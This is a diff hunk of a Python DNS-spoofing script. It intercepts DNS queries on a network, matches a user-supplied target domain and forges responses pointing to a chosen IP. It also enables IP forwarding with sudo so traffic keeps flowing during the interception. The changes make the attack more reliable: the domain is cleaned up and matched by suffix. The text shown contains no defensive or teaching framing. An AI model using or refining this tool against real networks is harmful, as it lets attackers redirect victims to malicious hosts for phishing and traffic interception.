@@ -13,10 +13,10 @@ def process_packet(inpacket):
     if inpacket.haslayer(DNS) and inpacket.getlayer(DNS).qr == 0:  # DNS query
 
         # Decode the requested domain name from the packet
-        requested_domain = inpacket[DNSQR].qname.decode('utf-8')
+        requested_domain = inpacket[DNSQR].qname.decode('utf-8').strip('.')
 
         # Check if the requested domain matches the target domain
-        if target_domain in requested_domain:
+        if requested_domain.endswith(target_domain):
             print(f"Intercepted DNS request for {requested_domain}")
 
             # Create a spoofed DNS response
@@ -54,7 +54,7 @@ def start_dns_spoofing():
 
 if __name__ == "__main__":
     # Enable IP forwarding to allow routing between interfaces (Linux only)
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
 
     # Get the target domain and spoofed IP from the user
     target_domain = input("Enter target domain: ")  # Domain to spoof
